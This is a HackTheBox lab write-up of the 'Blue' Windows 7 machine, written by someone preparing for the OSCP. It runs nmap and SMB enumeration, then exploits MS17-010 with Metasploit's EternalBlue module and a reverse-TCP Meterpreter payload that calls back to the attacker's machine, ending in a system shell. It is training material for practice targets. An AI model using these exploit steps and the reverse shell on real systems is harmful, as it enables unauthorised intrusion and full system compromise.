---
layout: post
title: "Blue Writeup - HackTheBox"
category: HackTheBox
---
## HTB - Blue
Welcome back again, new day new box. Lets do a windows box again, Blue is an easy box. Today is the last day of my first two weeks. After my first two weeks of fulltime self-study I am planning to start the Pen200/OSCP Course. So far I am very happy with my choice to start preparing my OSCP. I highly recommend to start with two weeks of fulltime preparation by, for instance, practicing hackthebox machines before you even purchase the Pen200/OSCP course. I did many easy/medium boxes since I am relatively new in the field of red-teaming and I do not want to get demotivated so early in the proces.
Anyways, here is my writeup of the machine calle Blue.


### Enum
As always we start to enumerate the target:

```
root@kali:/home/kali/Desktop/HTB/machines/blue# nmap -A 10.129.4.47 | tee firstnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 08:55 EST
Nmap scan report for 10.129.4.47
Host is up (0.012s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/18%OT=135%CT=1%CU=44477%PV=Y%DS=2%DC=T%G=Y%TM=602E72
OS:14%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS
OS:=7)SEQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%II=I%TS=7)OPS(O1=M54DNW8ST11%O2=M5
OS:4DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(
OS:W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000
OS:%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%R
OS:D=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 2s, median: 1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-02-18T13:56:33+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-18T13:56:30
|_  start_date: 2021-02-18T13:29:45

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   11.98 ms 10.10.14.1
2   12.19 ms 10.129.4.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.18 seconds

```

```
root@kali:/home/kali/Desktop/HTB/machines/blue# nmap -sS -sV --script=vuln 10.129.4.47 | tee secondnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 08:56 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.4.47
Host is up (0.014s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.09 seconds

```

Since I saw so much SMB/RPC like ports I ran some other enum commands targeted at SMB/RPC:

```
root@kali:/home/kali/Desktop/HTB/machines/blue# rpcclient -U "" 10.129.4.47
Enter WORKGROUP\'s password: 
rpcclient $> ls
command not found: ls
rpcclient $> dir
command not found: dir
rpcclient $> whoami
command not found: whoami
rpcclient $> help
---------------		----------------------
         MDSSVC		
fetch_properties		Fetch connection properties
fetch_attributes		Fetch attributes for a CNID
---------------		----------------------
        CLUSAPI		
clusapi_open_cluster		Open cluster
clusapi_get_cluster_name		Get cluster name
clusapi_get_cluster_version		Get cluster version
clusapi_get_quorum_resource		Get quorum resource
clusapi_create_enum		Create enum query
clusapi_create_enumex		Create enumex query
clusapi_open_resource		Open cluster resource
clusapi_online_resource		Set cluster resource online
clusapi_offline_resource		Set cluster resource offline
clusapi_get_resource_state		Get cluster resource state
clusapi_get_cluster_version2		Get cluster version2
clusapi_pause_node		Pause cluster node
clusapi_resume_node		Resume cluster node
---------------		----------------------
        WITNESS		
GetInterfaceList		
       Register		
     UnRegister		
    AsyncNotify		
     RegisterEx		
---------------		----------------------
          FSRVP		
fss_is_path_sup		Check whether a share supports shadow-copy requests
fss_get_sup_version		Get supported FSRVP version from server
fss_create_expose		Request shadow-copy creation and exposure
     fss_delete		Request shadow-copy share deletion
fss_has_shadow_copy		Check for an associated share shadow-copy
fss_get_mapping		Get shadow-copy share mapping information
fss_recovery_complete		Flag read-write snapshot as recovery complete, allowing further shadow-copy requests
---------------		----------------------
         WINREG		
 winreg_enumkey		Enumerate Keys
querymultiplevalues		Query multiple values
querymultiplevalues2		Query multiple values
---------------		----------------------
       EVENTLOG		
eventlog_readlog		Read Eventlog
eventlog_numrecord		Get number of records
eventlog_oldestrecord		Get oldest record
eventlog_reportevent		Report event
eventlog_reporteventsource		Report event and source
eventlog_registerevsource		Register event source
eventlog_backuplog		Backup Eventlog File
eventlog_loginfo		Get Eventlog Information
---------------		----------------------
        DRSUAPI		
   dscracknames		Crack Name
    dsgetdcinfo		Get Domain Controller Info
 dsgetncchanges		Get NC Changes
dswriteaccountspn		Write Account SPN
---------------		----------------------
         NTSVCS		
ntsvcs_getversion		Query NTSVCS version
ntsvcs_validatedevinst		Query NTSVCS device instance
ntsvcs_hwprofflags		Query NTSVCS HW prof flags
ntsvcs_hwprofinfo		Query NTSVCS HW prof info
ntsvcs_getdevregprop		Query NTSVCS device registry property
ntsvcs_getdevlistsize		Query NTSVCS device list size
ntsvcs_getdevlist		Query NTSVCS device list
---------------		----------------------
         WKSSVC		
wkssvc_wkstagetinfo		Query WKSSVC Workstation Information
wkssvc_getjoininformation		Query WKSSVC Join Information
wkssvc_messagebuffersend		Send WKSSVC message
wkssvc_enumeratecomputernames		Enumerate WKSSVC computer names
wkssvc_enumerateusers		Enumerate WKSSVC users
---------------		----------------------
       SHUTDOWN		
---------------		----------------------
       EPMAPPER		
         epmmap		Map a binding
      epmlookup		Lookup bindings
---------------		----------------------
           ECHO		
     echoaddone		Add one to a number
       echodata		Echo data
       sinkdata		Sink data
     sourcedata		Source data
---------------		----------------------
            DFS		
     dfsversion		Query DFS support
         dfsadd		Add a DFS share
      dfsremove		Remove a DFS share
     dfsgetinfo		Query DFS share info
        dfsenum		Enumerate dfs shares
      dfsenumex		Enumerate dfs shares
---------------		----------------------
         SRVSVC		
        srvinfo		Server query info
   netshareenum		Enumerate shares
netshareenumall		Enumerate all shares
netsharegetinfo		Get Share Info
netsharesetinfo		Set Share Info
netsharesetdfsflags		Set DFS flags
    netfileenum		Enumerate open files
   netremotetod		Fetch remote time of day
netnamevalidate		Validate sharename
  netfilegetsec		Get File security
     netsessdel		Delete Session
    netsessenum		Enumerate Sessions
    netdiskenum		Enumerate Disks
    netconnenum		Enumerate Connections
    netshareadd		Add share
    netsharedel		Delete share
---------------		----------------------
       NETLOGON		
     logonctrl2		Logon Control 2
   getanydcname		Get trusted DC name
      getdcname		Get trusted PDC name
  dsr_getdcname		Get trusted DC name
dsr_getdcnameex		Get trusted DC name
dsr_getdcnameex2		Get trusted DC name
dsr_getsitename		Get sitename
dsr_getforesttrustinfo		Get Forest Trust Info
      logonctrl		Logon Control
       samlogon		Sam Logon
change_trust_pw		Change Trust Account Password
    gettrustrid		Get trust rid
dsr_enumtrustdom		Enumerate trusted domains
dsenumdomtrusts		Enumerate all trusted domains in an AD forest
deregisterdnsrecords		Deregister DNS records
netrenumtrusteddomains		Enumerate trusted domains
netrenumtrusteddomainsex		Enumerate trusted domains
getdcsitecoverage		Get the Site-Coverage from a DC
   capabilities		Return Capabilities
logongetdomaininfo		Return LogonGetDomainInfo
---------------		----------------------
IRemoteWinspool		
winspool_AsyncOpenPrinter		Open printer handle
winspool_AsyncCorePrinterDriverInstalled		Query Core Printer Driver Installed
---------------		----------------------
        SPOOLSS		
      adddriver		Add a print driver
     addprinter		Add a printer
      deldriver		Delete a printer driver
    deldriverex		Delete a printer driver with files
       enumdata		Enumerate printer data
     enumdataex		Enumerate printer data for a key
        enumkey		Enumerate printer keys
       enumjobs		Enumerate print jobs
         getjob		Get print job
         setjob		Set print job
      enumports		Enumerate printer ports
    enumdrivers		Enumerate installed printer drivers
   enumprinters		Enumerate printers
        getdata		Get print driver data
      getdataex		Get printer driver data with keyname
      getdriver		Get print driver information
   getdriverdir		Get print driver upload directory
getdriverpackagepath		Get print driver package download directory
     getprinter		Get printer info
    openprinter		Open printer handle
 openprinter_ex		Open printer handle
      setdriver		Set printer driver
getprintprocdir		Get print processor directory
        addform		Add form
        setform		Set form
        getform		Get form
     deleteform		Delete form
      enumforms		Enumerate forms
     setprinter		Set printer comment
 setprintername		Set printername
 setprinterdata		Set REG_SZ printer data
       rffpcnex		Rffpcnex test
     printercmp		Printer comparison test
      enumprocs		Enumerate Print Processors
enumprocdatatypes		Enumerate Print Processor Data Types
   enummonitors		Enumerate Print Monitors
createprinteric		Create Printer IC
playgdiscriptonprinteric		Create Printer IC
getcoreprinterdrivers		Get CorePrinterDriver
enumpermachineconnections		Enumerate Per Machine Connections
addpermachineconnection		Add Per Machine Connection
delpermachineconnection		Delete Per Machine Connection
---------------		----------------------
           SAMR		
      queryuser		Query user info
     querygroup		Query group info
queryusergroups		Query user groups
queryuseraliases		Query user aliases
  querygroupmem		Query group membership
  queryaliasmem		Query alias membership
 queryaliasinfo		Query alias info
    deletealias		Delete an alias
  querydispinfo		Query display info
 querydispinfo2		Query display info
 querydispinfo3		Query display info
   querydominfo		Query domain info
   enumdomusers		Enumerate domain users
  enumdomgroups		Enumerate domain groups
  enumalsgroups		Enumerate alias groups
    enumdomains		Enumerate domains
  createdomuser		Create domain user
 createdomgroup		Create domain group
 createdomalias		Create domain alias
 samlookupnames		Look up names
  samlookuprids		Look up names
 deletedomgroup		Delete domain group
  deletedomuser		Delete domain user
 samquerysecobj		Query SAMR security object
   getdompwinfo		Retrieve domain password info
getusrdompwinfo		Retrieve user domain password info
   lookupdomain		Lookup Domain Name
      chgpasswd		Change user password
     chgpasswd2		Change user password
     chgpasswd3		Change user password
 getdispinfoidx		Get Display Information Index
    setuserinfo		Set user info
   setuserinfo2		Set user info2
---------------		----------------------
      LSARPC-DS		
  dsroledominfo		Get Primary Domain Information
---------------		----------------------
         LSARPC		
       lsaquery		Query info policy
     lookupsids		Convert SIDs to names
    lookupsids3		Convert SIDs to names
lookupsids_level		Convert SIDs to names
    lookupnames		Convert names to SIDs
   lookupnames4		Convert names to SIDs
lookupnames_level		Convert names to SIDs
      enumtrust		Enumerate trusted domains
      enumprivs		Enumerate privileges
    getdispname		Get the privilege name
     lsaenumsid		Enumerate the LSA SIDS
lsacreateaccount		Create a new lsa account
lsaenumprivsaccount		Enumerate the privileges of an SID
lsaenumacctrights		Enumerate the rights of an SID
     lsaaddpriv		Assign a privilege to a SID
     lsadelpriv		Revoke a privilege from a SID
lsaaddacctrights		Add rights to an account
lsaremoveacctrights		Remove rights from an account
lsalookupprivvalue		Get a privilege value given its name
 lsaquerysecobj		Query LSA security object
lsaquerytrustdominfo		Query LSA trusted domains info (given a SID)
lsaquerytrustdominfobyname		Query LSA trusted domains info (given a name), only works for Windows > 2k
lsaquerytrustdominfobysid		Query LSA trusted domains info (given a SID)
lsasettrustdominfo		Set LSA trusted domain info
    getusername		Get username
   createsecret		Create Secret
   deletesecret		Delete Secret
    querysecret		Query Secret
      setsecret		Set Secret
retrieveprivatedata		Retrieve Private Data
storeprivatedata		Store Private Data
 createtrustdom		Create Trusted Domain
 deletetrustdom		Delete Trusted Domain
---------------		----------------------
GENERAL OPTIONS		
           help		Get help on commands
              ?		Get help on commands
     debuglevel		Set debug level
          debug		Set debug level
           list		List available commands on <pipe>
           exit		Exit program
           quit		Exit program
           sign		Force RPC pipe connections to be signed
           seal		Force RPC pipe connections to be sealed
         packet		Force RPC pipe connections with packet authentication level
       schannel		Force RPC pipe connections to be sealed with 'schannel'. Assumes valid machine account to this domain controller.
   schannelsign		Force RPC pipe connections to be signed (not sealed) with 'schannel'.  Assumes valid machine account to this domain controller.
        timeout		Set timeout (in milliseconds) for RPC operations
      transport		Choose ncacn transport for RPC operations
           none		Force RPC pipe connections to have no special properties
rpcclient $> getusername
Account Name: Guest, Authority Name: haris-PC

```

```
root@kali:/home/kali/Desktop/HTB/machines/blue# smbclient //MOUNT/share -I 10.129.4.47 -N | tee smbclient.txt
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> pwd
Current directory is \\MOUNT\share\
smb: \> whoami
whoami: command not found
smb: \> getuid
getuid: command not found
smb: \> ls
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

		8362495 blocks of size 4096. 4211871 blocks available
smb: \> dir
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

		8362495 blocks of size 4096. 4211881 blocks available
smb: \> cd ..
smb: \> dir
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

		8362495 blocks of size 4096. 4211881 blocks available
smb: \> cd ..
smb: \> 

```

So I can get a shell of some sorts. I just dont know yet how to utilize them yet. So ill just go on and search some exploits and then maybe use these shells later on.


### Find the exploit 🔍

Basicly I started google-ing by the following keyword combinations:

- softwarename + softwareversion + exploit
- softwarename + softwareversion + exploit + github
- softwarename + softwareversion + github
- softwarename + softwareversion + exploitdb
- softwarename + softwareversion + exploit + exploitdb
- softwarename + softwareversion
- I also tried to utilize searchsploit, a tool that basicly is a CLI version of exploitDB.
- And I used the exploits that I got from nmap during enum


#### SMB
- smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
- [EternalBlue all over again, how original to name the box blue xD](https://www.exploit-db.com/exploits/42315)

#### Operating System
- OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
	- [Local privesc](https://www.exploit-db.com/exploits/47176)
I think i've got enough material now to go into exploitation.

### Exploitation galore 🔥
When I was doing a box called legacy I encountered a similair situation. At which I started with [this exploit](https://github.com/REPTILEHAUS/Eternal-Blue). So imma do that now as well. Tl;dr: It did not work, just like last time.

Lets see if [This archived exploit](https://github.com/mez-0/MS17-010-Python) will give me more information:
```
root@kali:/home/kali/Desktop/HTB/machines/blue/MS17-010-Python# python zzz_checker.py -t 10.129.4.47

███╗   ███╗███████╗ ██╗███████╗       ██████╗  ██╗ ██████╗ ...zzz_checker
████╗ ████║██╔════╝███║╚════██║      ██╔═████╗███║██╔═████╗
██╔████╔██║███████╗╚██║    ██╔╝█████╗██║██╔██║╚██║██║██╔██║
██║╚██╔╝██║╚════██║ ██║   ██╔╝ ╚════╝████╔╝██║ ██║████╔╝██║
██║ ╚═╝ ██║███████║ ██║   ██║        ╚██████╔╝ ██║╚██████╔╝
╚═╝     ╚═╝╚══════╝ ╚═╝   ╚═╝         ╚═════╝  ╚═╝ ╚═════╝ 

[18/02/21, 14:52:09] >> Attempting to connect to 10.129.4.47
[18/02/21, 14:52:09] >> Successfully connected to 10.129.4.47
[18/02/21, 14:52:09] >> Attempting to authenticate to 10.129.4.47
[18/02/21, 14:52:09] >> Successfully authenticated to 10.129.4.47
[18/02/21, 14:52:09] >> Attempting to get OS for 10.129.4.47
[18/02/21, 14:52:09] >> Got Operting System: Windows 7 Professional 7601 Service Pack 1
[18/02/21, 14:52:09] >> Attempting to connect to \\10.129.4.47\IPC$
[18/02/21, 14:52:09] >> Successfully connected to \\10.129.4.47\IPC$
[18/02/21, 14:52:09] >> Testing if 10.129.4.47 is vulnerable...
[18/02/21, 14:52:09] >> [10.129.4.47] VULNERABLE
[18/02/21, 14:52:09] >> Checking pipes on 10.129.4.47
[18/02/21, 14:52:09] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[18/02/21, 14:52:09] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[18/02/21, 14:52:09] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[18/02/21, 14:52:09] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[18/02/21, 14:52:10] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

Results:
10.129.4.47: no pipes accessible

```
Okay so no SMB pipes available but I do have IPC access. The exploit did not work. So I tried [this guide and exploit](https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/) but guess what, it dont work. So I went back to MSFConsole, something I dont like using:

```
root@kali:/home/kali/Desktop# msfconsole
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.0.29-dev                          ]
+ -- --=[ 2098 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View missing module options with show 
missing

msf6 > search ms17

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank     Check  Description
   -   ----                                                   ---------------  ----     -----  -----------
   0   auxiliary/admin/mssql/mssql_enum_domain_accounts                        normal   No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   1   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                   normal   No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   2   auxiliary/admin/mssql/mssql_enum_sql_logins                             normal   No     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
   3   auxiliary/admin/mssql/mssql_escalate_execute_as                         normal   No     Microsoft SQL Server Escalate EXECUTE AS
   4   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                    normal   No     Microsoft SQL Server SQLi Escalate Execute AS
   5   auxiliary/admin/smb/ms17_010_command                   2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   6   auxiliary/scanner/smb/smb_ms17_010                                      normal   No     MS17-010 SMB RCE Detection
   7   exploit/windows/fileformat/office_ms17_11882           2017-11-15       manual   No     Microsoft Office CVE-2017-11882
   8   exploit/windows/smb/ms17_010_eternalblue               2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   9   exploit/windows/smb/ms17_010_eternalblue_win8          2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   10  exploit/windows/smb/ms17_010_psexec                    2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11  exploit/windows/smb/smb_doublepulsar_rce               2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 11, use 11 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 8
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.44.135   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.129.99.155
rhosts => 10.129.99.155
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.37
lhost => 10.10.14.37
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.37:4444 
[*] 10.129.99.155:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.99.155:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.99.155:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.129.99.155:445 - Connecting to target for exploitation.
[+] 10.129.99.155:445 - Connection established for exploitation.
[+] 10.129.99.155:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.99.155:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.99.155:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.99.155:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.99.155:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.99.155:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.99.155:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.99.155:445 - Sending all but last fragment of exploit packet
[*] 10.129.99.155:445 - Starting non-paged pool grooming
[+] 10.129.99.155:445 - Sending SMBv2 buffers
[+] 10.129.99.155:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.99.155:445 - Sending final SMBv2 buffers.
[*] 10.129.99.155:445 - Sending last fragment of exploit packet!
[*] 10.129.99.155:445 - Receiving response from exploit packet
[+] 10.129.99.155:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.99.155:445 - Sending egg to corrupted connection.
[*] 10.129.99.155:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.129.99.155
[*] Meterpreter session 1 opened (10.10.14.37:4444 -> 10.129.99.155:49159) at 2021-02-18 15:32:21 -0500
[+] 10.129.99.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.99.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.99.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > pwd
C:\Windows\system32
meterpreter > shell
Process 1300 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Windows\system32

18/02/2021  15:16    <DIR>          .
18/02/2021  15:16    <DIR>          ..
12/04/2011  07:45    <DIR>          0409
10/07/2015  17:51           158,720 aaclient.dll
21/11/2010  03:24         3,745,792 accessibilitycpl.dll
14/07/2009  01:24            39,424 ACCTRES.dll
14/07/2009  01:40             9,216 acledit.dll
14/07/2009  01:40           154,112 aclui.dll
03/05/2017  13:05           127,488 acmigration.dll
21/11/2010  03:24            53,248 acppage.dll
14/07/2009  01:40            11,264 acproxy.dll
21/11/2010  03:24           780,800 ActionCenter.dll
21/11/2010  03:24           549,888 ActionCenterCPL.dll
21/11/2010  03:24           213,504 ActionQueue.dll
14/07/2009  01:40           267,776 activeds.dll
13/07/2009  23:53           111,616 activeds.tlb
21/11/2010  03:23           958,464 actxprxy.dll
14/07/2009  01:38            40,448 AdapterTroubleshooter.exe
21/11/2010  03:24           577,024 AdmTmpl.dll
04/03/2014  09:43            56,832 adprovider.dll
14/07/2009  01:40           239,104 adsldp.dll
14/07/2009  01:40           236,544 adsldpc.dll
14/07/2009  01:40           108,032 adsmsext.dll
14/07/2009  01:40           326,144 adsnt.dll
02/09/2016  15:30           690,688 adtschema.dll
15/07/2017  07:54    <DIR>          AdvancedInstallers
02/09/2016  15:30           880,640 advapi32.dll
14/07/2009  01:40           160,256 advpack.dll
14/07/2009  01:40             8,704 aecache.dll
14/07/2009  01:24            23,040 aeevts.dll
03/05/2017  15:29         1,206,272 aeinv.dll
29/10/2015  17:50            72,192 aelupsvc.dll
03/05/2017  13:05           217,088 aepic.dll
21/11/2010  03:24           122,880 aitagent.exe
23/03/2017  02:06         1,691,136 aitstatic.exe
14/07/2009  01:38            79,360 alg.exe
14/07/2009  01:40            53,248 AltTab.dll
13/07/2009  20:49            18,432 amcompat.tlb
21/11/2010  03:24            89,088 amstream.dll
14/07/2009  01:40            25,600 amxread.dll
14/07/2009  01:40         2,134,528 apds.dll
